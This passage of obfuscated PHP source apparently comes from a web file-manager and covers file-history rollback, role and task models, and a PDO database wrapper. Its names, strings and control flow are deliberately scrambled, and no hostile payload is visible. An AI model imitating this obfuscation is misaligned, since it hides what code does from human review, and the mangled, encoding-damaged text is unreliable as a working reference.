$Eš…Ñ¼Ì‹Ø[$eÕ¼¡¿¯¼Œ[374]][$Dºíåß…¼Ã][$eÕ¼¡¿¯¼Œ[38]] = $aóÄ‚ñåèŒ; } } $Eš…Ñ¼Ì‹Ø[$eÕ¼¡¿¯¼Œ[1106]] = IO::move($Eš…Ñ¼Ì‹Ø[$eÕ¼¡¿¯¼Œ[1106]], $d—Ã®×Úíí, !1, $b«¼ÚÁÑ– . $B††Ûí™Û„); goto dãß”ĞôÒ‚; d¿ æµŞÒÀ: } public static function rollback($fï¶ë¥·’÷, $F‡çÛÉÚâÜ) { $e×½Ğµ¾ºÄ =& $_SERVER[¾÷]; $FºËè´„éª = self::listData($fï¶ë¥·’÷); if (!$FºËè´„éª) { return; } $dÂ¶¥¯² = IO::info($fï¶ë¥·’÷); foreach ($FºËè´„éª[$e×½Ğµ¾ºÄ[374]] as $fÉñ«ğïé‰ => $dàò£½Ç›) { if ($dàò£½Ç›[$e×½Ğµ¾ºÄ[397]] == $F‡çÛÉÚâÜ) { self::add($fï¶ë¥·’÷); $D¸ˆÖ›Ğí™ = $FºËè´„éª[$e×½Ğµ¾ºÄ[1105]] . $dàò£½Ç›[$e×½Ğµ¾ºÄ[38]]; $DŞÜïˆ‹¾ = IO::copy($D¸ˆÖ›Ğí™, IO::pathFather($fï¶ë¥·’÷), REPEAT_REPLACE, $dÂ¶¥¯²[$e×½Ğµ¾ºÄ[38]]); if ($DŞÜïˆ‹¾) { self::remove($fï¶ë¥·’÷, $F‡çÛÉÚâÜ); } return $DŞÜïˆ‹¾; } } return !1; } public static function setDetail($B»±ê¼›×, $FÏÖ£’ö„°, $fÅëô¶ç¯£) { $aŞƒòµã– =& $_SERVER[¾÷]; $bî«¼œôá = self::listData($B»±ê¼›×); if (!$bî«¼œôá) { return; } foreach ($bî«¼œôá[$aŞƒòµã–[374]] as $b ğòç­‚ => $Dë†Ù‘¾¦Æ) { if ($Dë†Ù‘¾¦Æ[$aŞƒòµã–[397]] == $FÏÖ£’ö„°) { $bî«¼œôá[$aŞƒòµã–[374]][$b ğòç­‚][$aŞƒòµã–[1104]] = $fÅëô¶ç¯£; self::saveData($bî«¼œôá[$aŞƒòµã–[1106]], $bî«¼œôá[$aŞƒòµã–[374]]); return !0; } } return !1; } public static function fileInfo($bÏ’àƒ“øË, $aËïÜæ·çå) { goto cŞÆ™ÅåŒ; aßŞˆÈÎÅĞ: $BŸÎ¤¹á•‰ = $d”°ÜÏÚ‘Ì[43]; foreach ($A—¥šÃœÑÍ[$d”°ÜÏÚ‘Ì[374]] as $C‹Æ©‘ñ­‚ => $fõ•çÑÌÍĞ) { if ($fõ•çÑÌÍĞ[$d”°ÜÏÚ‘Ì[397]] != $aËïÜæ·çå) { continue; } $BŸÎ¤¹á•‰ = $A—¥šÃœÑÍ[$d”°ÜÏÚ‘Ì[1105]] . $fõ•çÑÌÍĞ[$d”°ÜÏÚ‘Ì[38]]; break; } if (!$BŸÎ¤¹á•‰) { show_json(LNG($d”°ÜÏÚ‘Ì[114]), !1); } goto b†¦„Ëõ¬; cŞÆ™ÅåŒ: $d”°ÜÏÚ‘Ì =& $_SERVER[¾÷]; $A—¥šÃœÑÍ = self::listData($bÏ’àƒ“øË); if (!$A—¥šÃœÑÍ) { show_json(LNG($d”°ÜÏÚ‘Ì[114]), !1); } goto aßŞˆÈÎÅĞ; b†¦„Ëõ¬: return IO::info($BŸÎ¤¹á•‰); goto B¨Œß£¥®; B¨Œß£¥®: } public static function fileOut($fİ£Âä­, $bÜ˜ôø¥İ, $C˜”Œƒ¤â‚ = false) { $bä®î•òÌï =& $_SERVER[¾÷]; $eéÏ“å®£ = self::fileInfo($fİ£Âä­, $bÜ˜ôø¥İ); $Dİ¼²¨ÏØ =& $GLOBALS[$bä®î•òÌï[17]]; $C˜”Œƒ¤â‚ = isset($Dİ¼²¨ÏØ[$bä®î•òÌï[1070]]) && $Dİ¼²¨ÏØ[$bä®î•òÌï[1070]] == 1; if (isset($Dİ¼²¨ÏØ[$bä®î•òÌï[39]]) && $Dİ¼²¨ÏØ[$bä®î•òÌï[39]] == $bä®î•òÌï[1107]) { return IO::fileOutImage($eéÏ“å®£[$bä®î•òÌï[85]], $Dİ¼²¨ÏØ[$bä®î•òÌï[1108]]); } IO::fileOut($eéÏ“å®£[$bä®î•òÌï[85]], $C˜”Œƒ¤â‚, get_path_this($fİ£Âä­)); } public static function listData($BÂƒÏ©íñì, $bŠ‰æğœÅ½ = true) { goto C’¸‰™Æã¦; CÖ‹İÆÏàõ: if (substr($BÂƒÏ©íñì, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $EˆÕòŠğİ = self::pathHistory($BÂƒÏ©íñì); $f«ÇÃµ¢ˆ = array($fíöÁ×Èïİ[1106] => $EˆÕòŠğİ . $fíöÁ×Èïİ[1093], $fíöÁ×Èïİ[1105] => rtrim(get_path_father($EˆÕòŠğİ), $fíöÁ×Èïİ[18]) . $fíöÁ×Èïİ[18], $fíöÁ×Èïİ[374] => array()); goto FÚçßµÑº; C’¸‰™Æã¦: $fíöÁ×Èïİ =& $_SERVER[¾÷]; if ($bŠ‰æğœÅ½ && !IO::exist($BÂƒÏ©íñì)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto CÖ‹İÆÏàõ; FÚçßµÑº: $C•„ïö±ŒÑ = IO::getContent($f«ÇÃµ¢ˆ[$fíöÁ×Èïİ[1106]]); if ($C•„ïö±ŒÑ) { $EİåÇ•‘‡ = json_decode($C•„ïö±ŒÑ, !0); if (is_array($EİåÇ•‘‡)) { $f«ÇÃµ¢ˆ[$fíöÁ×Èïİ[374]] = $EİåÇ•‘‡; } } return $f«ÇÃµ¢ˆ; goto FÜŠÒ†‚õÃ; FÜŠÒ†‚õÃ: } private static function saveData($DÆåÊ¤‘İ, $aâäß¶³…Ã) { goto d‹”…˜á–Õ; d‹”…˜á–Õ: $eÒ±Çß¾ğ =& $_SERVER[¾÷]; self::log($eÒ±Çß¾ğ[1109] . $DÆåÊ¤‘İ . $eÒ±Çß¾ğ[77] . count($aâäß¶³…Ã), $eÒ±Çß¾ğ[713]); if ($aâäß¶³…Ã) { return IO::setContent($DÆåÊ¤‘İ, json_encode($aâäß¶³…Ã)); } goto cšøù¨îÙî; cšøù¨îÙî: $f‹ç‘õŠ¾• = IO::pathFather($DÆåÊ¤‘İ); IO::remove($DÆåÊ¤‘İ); self::clearEmptyFolder($f‹ç‘õŠ¾•); goto c´åÌ×¦; c´åÌ×¦: return !0; goto BœÓˆƒÁ®Í; BœÓˆƒÁ®Í: } public static function clearEmptyFolder($cè¶Ê˜¸ˆ’) { goto Eñ„ˆí˜Ê; A‡©Ÿë¸: self::clearEmptyFolder($EÑœñªŸ–˜); goto dÑÃÜçÒ‰; A®ÇÙÙ¸…Ÿ: $d÷©Á¬ù™‡ = IO::has($cè¶Ê˜¸ˆ’, !0); if ($d÷©Á¬ù™‡[$D¥éÎ¸÷º[211]] > 0 || $d÷©Á¬ù™‡[$D¥éÎ¸÷º[212]] > 0) { return; } IO::remove($cè¶Ê˜¸ˆ’); goto A‡©Ÿë¸; Eñ„ˆí˜Ê: $D¥éÎ¸÷º =& $_SERVER[¾÷]; if (trim($cè¶Ê˜¸ˆ’, $D¥éÎ¸÷º[18]) == trim(self::$_historyBase, $D¥éÎ¸÷º[18])) { return; } $EÑœñªŸ–˜ = IO::pathFather($cè¶Ê˜¸ˆ’); goto A®ÇÙÙ¸…Ÿ; dÑÃÜçÒ‰: } private static function getBasePath() { goto F§Üô«èÊÁ; dòŒÃïÃ˜ñ: $a‘ˆö«¬ªã = DATA_PATH . $aÑƒ†ĞË[1112]; $a‘ˆö«¬ªã = IO::mkdir($a‘ˆö«¬ªã); $a‘ˆö«¬ªã = rtrim($a‘ˆö«¬ªã, $aÑƒ†ĞË[18]) . $aÑƒ†ĞË[18]; goto E–Ã¤‰¿; E–Ã¤‰¿: file_put_contents($a‘ˆö«¬ªã . $aÑƒ†ĞË[1113], $aÑƒ†ĞË[43]); Model($aÑƒ†ĞË[1110])->set($aÑƒ†ĞË[1111], $a‘ˆö«¬ªã); return $a‘ˆö«¬ªã; goto f¬ª„İğß; F§Üô«èÊÁ: $aÑƒ†ĞË =& $_SERVER[¾÷]; $a‘ˆö«¬ªã = Model($aÑƒ†ĞË[1110])->get($aÑƒ†ĞË[1111]); if (IO::exist($a‘ˆö«¬ªã)) { return $a‘ˆö«¬ªã; } goto dòŒÃïÃ˜ñ; f¬ª„İğß: } } goto F˜–›ÛÓš¹; Aœæ¾½¡­ª: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\x2e\x72\157\x6c\x65\x4c\x69\163\x74"; public $field = array("\x6e\x61\155\145", "\141\165\164\150", "\x6c\x61\x62\145\x6c", "\144\x69\163\x70\154\x61\x79", "\x73\x79\163\x74\145\x6d", "\x64\145\x73\x63", "\x69\x67\x6e\x6f\162\145\x45\x78\164", "\x69\x67\x6e\x6f\x72\145\x46\151\x6c\x65\x53\x69\172\x65", "\x61\144\x6d\151\156\x69\x73\x74\162\141\164\x6f\162", "\x73\157\162\x74"); public function listData($E™ŞÏ†¦Ã¥ = false, $CÖ´î¾Õê¢ = "\163\x6f\162\x74", $A…±¢”ÆÙï = false) { $DÜ½³¬ö£Š =& $_SERVER[¾÷]; $bÚ²„Ä = parent::listData($E™ŞÏ†¦Ã¥, $CÖ´î¾Õê¢, $A…±¢”ÆÙï); if (!$E™ŞÏ†¦Ã¥) { foreach ($bÚ²„Ä as $dñ¶±®ËÈ¼ => $Cîïœ™Ô¬) { if ($Cîïœ™Ô¬[$DÜ½³¬ö£Š[1858]] == 1) { $bÚ²„Ä[$dñ¶±®ËÈ¼][$DÜ½³¬ö£Š[434]] = LNG($DÜ½³¬ö£Š[2079]); } } } return $bÚ²„Ä; } public function update($FŒ¶øÅÆ¨¯, $f·‡ö‘› Ğ) { goto aíàæÑ±œ±; aíàæÑ±œ±: $b×Ñ§‰èàÆ =& $_SERVER[¾÷]; $bØ÷‰¶» = parent::listData($FŒ¶øÅÆ¨¯); $a®Í´‚Îƒ = $this->findByName($f·‡ö‘› Ğ[$b×Ñ§‰èàÆ[38]]); goto f¢ƒ¶ƒÅ¬; b¸çïƒ½: return parent::update($FŒ¶øÅÆ¨¯, $f·‡ö‘› Ğ); goto e“ áíøÕÅ; f¢ƒ¶ƒÅ¬: if (!$bØ÷‰¶» || $a®Í´‚Îƒ && $a®Í´‚Îƒ[$b×Ñ§‰èàÆ[397]] != $bØ÷‰¶»[$b×Ñ§‰èàÆ[397]]) { return !1; } if ($a®Í´‚Îƒ[$b×Ñ§‰èàÆ[1858]] == 1) { $f·‡ö‘› Ğ = array($b×Ñ§‰èàÆ[38] => $f·‡ö‘› Ğ[$b×Ñ§‰èàÆ[38]], $b×Ñ§‰èàÆ[1689] => $f·‡ö‘› Ğ[$b×Ñ§‰èàÆ[1689]]); } $this->filterAuth($f·‡ö‘› Ğ[$b×Ñ§‰èàÆ[409]]); goto b¸çïƒ½; e“ áíøÕÅ: } public function remove($CÅÀ”ƒŒİñ) { $DºÆÛø‚À¬ = parent::listData($CÅÀ”ƒŒİñ); if (!$DºÆÛø‚À¬ || $DºÆÛø‚À¬[$_SERVER[¾÷][1145]]) { return !1; } return parent::remove($CÅÀ”ƒŒİñ); } public function add($Cö—õĞŞäì) { goto e“ÙÚÖëÁ‡; eÔ‰ãÅª: return parent::insert($Cö—õĞŞäì); goto e…òŠÆ°·°; e“ÙÚÖëÁ‡: $D‡­§ˆ¸‚® =& $_SERVER[¾÷]; $FÂ©Å¥ÜÏ = $Cö—õĞŞäì[$D‡­§ˆ¸‚®[38]]; if ($this->findByName($FÂ©Å¥ÜÏ)) { return !1; } goto D°…õ™¡–Ë; D°…õ™¡–Ë: $dİÓÅî‹¨À = array($D‡­§ˆ¸‚®[416] => $FÂ©Å¥ÜÏ, $D‡­§ˆ¸‚®[1674] => $D‡­§ˆ¸‚®[43], $D‡­§ˆ¸‚®[1670] => $D‡­§ˆ¸‚®[1678], $D‡­§ˆ¸‚®[2080] => 1, $D‡­§ˆ¸‚®[1673] => 0, $D‡­§ˆ¸‚®[2081] => 0, $D‡­§ˆ¸‚®[1672] => $this->getSort()); $Cö—õĞŞäì = array_merge($dİÓÅî‹¨À, $Cö—õĞŞäì); $this->filterAuth($Cö—õĞŞäì[$D‡­§ˆ¸‚®[409]]); goto eÔ‰ãÅª; e…òŠÆ°·°: } private function getSort() { $AÂ²¸ğÂ„¤ =& $_SERVER[¾÷]; $FÒ½‹âÑÒ… = parent::listData(); $Bİ«µÛØ†Á = array_to_keyvalue($FÒ½‹âÑÒ…, $AÂ²¸ğÂ„¤[43], $AÂ²¸ğÂ„¤[1691]); return empty($Bİ«µÛØ†Á) ? 0 : max($Bİ«µÛØ†Á) + 1; } private function filterAuth(&$BÌ¥Ë¡Ã¹„) { $fášÛ¢£àß =& $_SERVER[¾÷]; $eÎÀ–Â Š‡ = array(); $dÇ•¿ Ä = array_filter(explode($fášÛ¢£àß[57], $BÌ¥Ë¡Ã¹„)); foreach ($dÇ•¿ Ä as $BÌ¥Ë¡Ã¹„) { $CùŞğ˜¶ = explode($fášÛ¢£àß[104], $BÌ¥Ë¡Ã¹„); if ($CùŞğ˜¶[0] == $fášÛ¢£àß[2082] && $CùŞğ˜¶[1] != $fášÛ¢£àß[1066]) { $dÌÁò†Ğ‡® = $CùŞğ˜¶[0] . $fášÛ¢£àß[104] . $CùŞğ˜¶[1] . $fášÛ¢£àß[2083]; if (!in_array($dÌÁò†Ğ‡®, $dÇ•¿ Ä)) { $eÎÀ–Â Š‡[] = $dÌÁò†Ğ‡®; } } $eÎÀ–Â Š‡[] = $BÌ¥Ë¡Ã¹„; } $BÌ¥Ë¡Ã¹„ = implode($fášÛ¢£àß[57], $eÎÀ–Â Š‡); } public function sort($aù´ö¹—Èæ, $bå”–¶ñ†¹) { return parent::update($aù´ö¹—Èæ, $bå”–¶ñ†¹); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\164\141\163\153\114\151\163\164"; public $field = array("\156\141\155\x65", "\164\x79\160\x65", "\145\x76\145\156\164", "\164\x69\x6d\x65", "\144\x65\x73\x63", "\x73\171\163\x74\x65\x6d", "\145\x6e\x61\142\154\145", "\x6c\x61\163\164\122\x75\156", "\163\x6f\162\x74"); public function listData($cİ³«Ô¾š = false, $dÒÓÕóëœÙ = "\163\x6f\162\x74", $Aì¾°Ó·¥ = false) { return parent::listData($cİ³«Ô¾š, $dÒÓÕóëœÙ, $Aì¾°Ó·¥); } public function add($E ½Ì¾°‹ò) { $dæÉôõ•² =& $_SERVER[¾÷]; $Eì”ëÕøÆØ = $this->findByName($E ½Ì¾°‹ò[$dæÉôõ•²[38]]); if ($Eì”ëÕøÆØ) { return !1; } $E ½Ì¾°‹ò[$dæÉôõ•²[1469]] = 0; $E ½Ì¾°‹ò[$dæÉôõ•²[1691]] = $this->getSort(); return parent::insert($E ½Ì¾°‹ò); } private function getSort() { $bƒ£†ºÑ½ì =& $_SERVER[¾÷]; $CÇˆ¸Ù¾ = parent::listData(); $Bõ†ŒãÕ¤ƒ = array_to_keyvalue($CÇˆ¸Ù¾, $bƒ£†ºÑ½ì[43], $bƒ£†ºÑ½ì[1691]); return empty($Bõ†ŒãÕ¤ƒ) ? 0 : max($Bõ†ŒãÕ¤ƒ) + 1; } public function update($AæÙµåã¼É, $e×„â»œ†) { $cƒ‹­’¯ =& $_SERVER[¾÷]; $b”Õ»›ÑÍæ = $this->listData($AæÙµåã¼É); $cÔ–ƒ‚ÖÉ… = $this->findByName($e×„â»œ†[$cƒ‹­’¯[38]]); if (!$b”Õ»›ÑÍæ || $cÔ–ƒ‚ÖÉ… && $cÔ–ƒ‚ÖÉ…[$cƒ‹­’¯[397]] != $b”Õ»›ÑÍæ[$cƒ‹­’¯[397]]) { return !1; } return parent::update($AæÙµåã¼É, $e×„â»œ†); } public function remove($DË¶¥ËñÒ¾, $Cí–Ä­ÉÌÄ = false) { $D™”ÉêÀ­ =& $_SERVER[¾÷]; $bŒ»»šÉŒª = $this->listData($DË¶¥ËñÒ¾); if (!$bŒ»»šÉŒª) { return; } if (!$Cí–Ä­ÉÌÄ && $bŒ»»šÉŒª[$D™”ÉêÀ­[1145]] == $D™”ÉêÀ­[96]) { return !1; } return parent::remove($DË¶¥ËñÒ¾); } public function enable($bŸÈ¦ù²…Ø, $b¯•”ŸÍ¾Ì) { return $this->update($bŸÈ¦ù²…Ø, array($_SERVER[¾÷][2074] => $b¯•”ŸÍ¾Ì)); } public function run($F¥ÓÄƒ‰„Î) { return $this->update($F¥ÓÄƒ‰„Î, array($_SERVER[¾÷][2084] => time())); } } goto cÕ˜Ñ˜ç¥Œ; a¥Æºßßé“: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($FÑ§‘‰µÜµ = '') { $b†‡öõø‘ =& $_SERVER[¾÷]; if (!class_exists($b†‡öõø‘[850])) { think_exception(think_lang($b†‡öõø‘[20]) . $b†‡öõø‘[851]); } if (!empty($FÑ§‘‰µÜµ)) { $this->config = $FÑ§‘‰µÜµ; if (empty($this->config[$b†‡öõø‘[23]])) { $this->config[$b†‡öõø‘[23]] = array(); } } } public function connect($f„ÖÖ™Ò = '', $B¿ë™èÎ¡· = 0) { $FÀáî“Ë =& $_SERVER[¾÷]; if (!isset($this->linkID[$B¿ë™èÎ¡·])) { goto E•ª®¥À„; cÏš´éÕ–›: if (1 != think_config($FÀáî“Ë[28])) { unset($this->config); } goto b…Ë¿í·«Ç; A°æ¬åŸêœ: if (!$this->linkID[$B¿ë™èÎ¡·]) { think_exception($FÀáî“Ë[860]); } try { $this->linkID[$B¿ë™èÎ¡·]->exec($FÀáî“Ë[861] . think_config($FÀáî“Ë[828])); } catch (Exception $AºÀ¡¦î†) { } $this->connected = !0; goto cÏš´éÕ–›; E•ª®¥À„: if (empty($f„ÖÖ™Ò)) { $f„ÖÖ™Ò = $this->config; } $fÁ®´‡õ­¯ = !empty($f„ÖÖ™Ò[$FÀáî“Ë[23]][$FÀáî“Ë[24]]) ? $f„ÖÖ™Ò[$FÀáî“Ë[23]][$FÀáî“Ë[24]] : $this->pconnect; if ($fÁ®´‡õ­¯) { $f„ÖÖ™Ò[$FÀáî“Ë[23]][PDO::ATTR_PERSISTENT] = !0; } goto D…‰áÚĞ¼Ä; D…‰áÚĞ¼Ä: try { $this->linkID[$B¿ë™èÎ¡·] = new PDO($f„ÖÖ™Ò[$FÀáî“Ë[852]], $f„ÖÖ™Ò[$FÀáî“Ë[825]], $f„ÖÖ™Ò[$FÀáî“Ë[826]], $f„ÖÖ™Ò[$FÀáî“Ë[23]]); } catch (PDOException $AºÀ¡¦î†) { think_exception($AºÀ¡¦î†->getMessage()); } $this->dbType = $this->_getDsnType($f„ÖÖ™Ò[$FÀáî“Ë[852]]); if (in_array($this->dbType, array($FÀáî“Ë[853], $FÀáî“Ë[854], $FÀáî“Ë[855], $FÀáî“Ë[856]))) { think_exception($FÀáî“Ë[857] . $this->dbType . $FÀáî“Ë[858] . $this->dbType . $FÀáî“Ë[859]); } goto A°æ¬åŸêœ; b…Ë¿í·«Ç: } return $this->linkID[$B¿ë™èÎ¡·]; } public function free() { $this->PDOStatement = null; } public function query($Béèª‡Œêà, $f­×—³ Ê = array()) { goto B™‹ó›Á±´; B™‹ó›Á±´: $e®¸ˆÈçùÓ =& $_SERVER[¾÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto a¢áæìšÛÆ; BÓƒ‘Î´ïÀ: think_action_status($e®¸ˆÈçùÓ[29], 1); think_status($e®¸ˆÈçùÓ[30]); $this->PDOStatement = $this->_linkID->prepare($Béèª‡Œêà); goto cã­·éæÌİ; a¢áæìšÛÆ: $this->queryStr = $Béèª‡Œêà; if (!empty($f­×—³ Ê)) { $this->queryStr .= $e®¸ˆÈçùÓ[862] . print_r($f­×—³ Ê, !0) . $e®¸ˆÈçùÓ[863]; } if (!empty($this->PDOStatement)) { $this->free(); } goto BÓƒ‘Î´ïÀ; EÔ‰ìîóæ‡: if (!1 === $aš‹ÚÈ×Ô) { $this->error(); return !1; } else { return $this->getAll(); } goto Fƒ—ß¯À‡; cã­·éæÌİ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $aš‹ÚÈ×Ô = $this->PDOStatement->execute($f­×—³ Ê); $this->debug(); goto EÔ‰ìîóæ‡; Fƒ—ß¯À‡: } public function execute($aŒ®‹ë†œÀ, $c˜†íè¨ËÆ = array()) { goto CŒÈ™ˆÉÜ; a½‡Ş°ÈËÄ: think_status($cÀ¼ÉšÇ´·[30]); $this->PDOStatement = $this->_linkID->prepare($aŒ®‹ë†œÀ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto fÔ ŒàÏß; eìÓî¼õ›è: if ($this->dbType == $cÀ¼ÉšÇ´·[856]) { if (preg_match($cÀ¼ÉšÇ´·[864], $this->queryStr, $dšôÈÍÒ‰ò)) { $this->table = think_config($cÀ¼ÉšÇ´·[865]) . str_ireplace(think_config($cÀ¼ÉšÇ´·[866]), $cÀ¼ÉšÇ´·[382], $dšôÈÍÒ‰ò[2]); $CĞã¤›¹ëœ = (bool) $this->query($cÀ¼ÉšÇ´·[867] . strtoupper($this->table) . $cÀ¼ÉšÇ´·[65]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($cÀ¼ÉšÇ´·[31], 1); goto a½‡Ş°ÈËÄ; CŒÈ™ˆÉÜ: $cÀ¼ÉšÇ´· =& $_SERVER[¾÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F•‰òÀïØÍ; fÔ ŒàÏß: $a«²³¬ì = $this->PDOStatement->execute($c˜†íè¨ËÆ); $this->debug(); if (!1 === $a«²³¬ì) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($CĞã¤›¹ëœ || preg_match($cÀ¼ÉšÇ´·[868], $aŒ®‹ë†œÀ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto F³‘çé×œŠ; F•‰òÀïØÍ: $this->queryStr = $aŒ®‹ë†œÀ; if (!empty($c˜†íè¨ËÆ)) { $this->queryStr .= $cÀ¼ÉšÇ´·[862] . print_r($c˜†íè¨ËÆ, !0) . $cÀ¼ÉšÇ´·[863]; } $CĞã¤›¹ëœ = !1; goto eìÓî¼õ›è; F³‘çé×œŠ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $BÚç¶Ì˜¡ê = $this->_linkID->commit(); $this->transTimes = 0; if (!$BÚç¶Ì˜¡ê) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Bö‹˜òÈ¿Æ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Bö‹˜òÈ¿Æ) { $this->error(); return !1; } } return !0; } private function getAll() { $E†ã´éƒ—¢ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($E†ã´éƒ—¢); return $E†ã´éƒ—¢; } public function getFields($FÈÌ²Ïğè„) { goto FŸŸŠöô…§; e ›Ò¥Æ‘É: return $EÂ‘àö¤Í; goto B¼„œòîØ; cáïÏäÅ‹î: $BÄÀ¦ÊÓËŒ = $this->query($EÃ‰—¡ÌÔƒ); $EÂ‘àö¤Í = array(); if ($BÄÀ¦ÊÓËŒ) { foreach ($BÄÀ¦ÊÓËŒ as $Dß°ø¤ƒª¥ => $BƒÙÍ‡²³) { $BƒÙÍ‡²³ = array_change_key_case($BƒÙÍ‡²³); $BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[38]] = isset($BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[38]]) ? $BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[38]] : $C˜óÍ´Æ¯œ[382]; $BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[39]] = isset($BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[39]]) ? $BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[39]] : $C˜óÍ´Æ¯œ[382]; $dƒæØÚÉ¨‡ = isset($BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[278]]) ? $BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[278]] : $BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[38]]; $EÂ‘àö¤Í[$dƒæØÚÉ¨‡] = array($C˜óÍ´Æ¯œ[38] => $dƒæØÚÉ¨‡, $C˜óÍ´Æ¯œ[39] => $BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[39]], $C˜óÍ´Æ¯œ[41] => (bool) (isset($BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[112]]) && $BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[112]] === $C˜óÍ´Æ¯œ[43] || isset($BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[41]]) && $BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[41]] === $C˜óÍ´Æ¯œ[43]), $C˜óÍ´Æ¯œ[44] => isset($BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[44]]) ? $BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[44]] : (isset($BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[63]]) ? $BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[63]] : $C˜óÍ´Æ¯œ[382]), $C˜óÍ´Æ¯œ[46] => isset($BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[102]]) ? strtolower($BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[102]]) == $C˜óÍ´Æ¯œ[48] : (isset($BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[64]]) ? $BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[64]] : !1), $C˜óÍ´Æ¯œ[49] => isset($BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[885]]) ? strtolower($BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[885]]) == $C˜óÍ´Æ¯œ[51] : (isset($BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[102]]) ? $BƒÙÍ‡²³[$C˜óÍ´Æ¯œ[102]] : !1)); } } goto e ›Ò¥Æ‘É; FŸŸŠöô…§: $C˜óÍ´Æ¯œ =& $_SERVER[¾÷]; $this->initConnect(!0); if (think_config($C˜óÍ´Æ¯œ[869])) { $EÃ‰—¡ÌÔƒ = str_replace($C˜óÍ´Æ¯œ[870], $FÈÌ²Ïğè„, think_config($C˜óÍ´Æ¯œ[869])); } else { switch ($this->dbType) { case $C˜óÍ´Æ¯œ[853]: case $C˜óÍ´Æ¯œ[871]: $EÃ‰—¡ÌÔƒ = "\123\x45\114\x45\103\124\40\x20\x20\x63\x6f\154\165\155\156\x5f\156\141\155\145\x20\x61\x73\x20\x27\116\x61\155\145\x27\x2c\40\x20\40\144\141\x74\141\137\x74\x79\160\145\40\141\x73\x20\x27\124\171\x70\145\x27\54\40\40\40\x63\x6f\154\x75\155\x6e\x5f\144\145\146\141\165\154\164\x20\x61\x73\x20\x27\x44\145\146\x61\165\x6c\x74\47\x2c\40\x20\x20\x69\x73\x5f\156\x75\x6c\154\x61\x62\154\145\40\141\x73\40\47\116\165\154\x6c\47\xa\11\11\x46\122\117\115\11\x69\x6e\146\x6f\x72\155\x61\164\x69\x6f\156\x5f\163\x63\150\145\155\x61\56\x74\x61\x62\x6c\x65\163\40\101\123\x20\164\12\11\x9\x4a\x4f\x49\x4e\x9\x69\156\146\x6f\162\x6d\141\164\x69\157\x6e\137\163\x63\x68\145\155\141\x2e\143\x6f\x6c\165\x6d\x6e\x73\40\x41\x53\x20\x63\12\11\x9\x4f\x4e\x20\40\164\x2e\x74\x61\x62\x6c\x65\x5f\143\141\164\x61\154\x6f\x67\x20\75\40\143\56\164\141\142\154\145\137\x63\x61\164\141\x6c\157\147\xa\x9\x9\101\x4e\x44\40\x74\x2e\164\x61\x62\154\145\x5f\x73\143\x68\x65\x6d\141\40\75\40\143\x2e\164\x61\142\154\x65\137\163\x63\150\x65\155\x61\xa\x9\x9\x41\116\104\x20\x74\56\x74\141\x62\154\x65\137\156\x61\155\x65\40\75\x20\x63\x2e\x74\141\x62\154\145\x5f\156\x61\155\x65\12\11\x9\127\x48\105\x52\105\x20\40\40\164\56\164\x61\142\154\x65\x5f\156\x61\x6d\145\40\x3d\x20\47{$FÈÌ²Ïğè„}\47"; break; case $C˜óÍ´Æ¯œ[872]: $EÃ‰—¡ÌÔƒ = $C˜óÍ´Æ¯œ[873] . $FÈÌ²Ïğè„ . $C˜óÍ´Æ¯œ[874]; break; case $C˜óÍ´Æ¯œ[854]: case $C˜óÍ´Æ¯œ[856]: $EÃ‰—¡ÌÔƒ = $C˜óÍ´Æ¯œ[875] . $C˜óÍ´Æ¯œ[876] . $C˜óÍ´Æ¯œ[877] . strtoupper($FÈÌ²Ïğè„) . $C˜óÍ´Æ¯œ[878] . strtoupper($FÈÌ²Ïğè„) . $C˜óÍ´Æ¯œ[879]; break; case $C˜óÍ´Æ¯œ[880]: $EÃ‰—¡ÌÔƒ = $C˜óÍ´Æ¯œ[881] . $FÈÌ²Ïğè„ . $C˜óÍ´Æ¯œ[882]; break; case $C˜óÍ´Æ¯œ[855]: break; case $C˜óÍ´Æ¯œ[883]: default: $EÃ‰—¡ÌÔƒ = $C˜óÍ´Æ¯œ[884] . ($this->dbType == $C˜óÍ´Æ¯œ[883] ? "\140{$FÈÌ²Ïğè„}\140" : 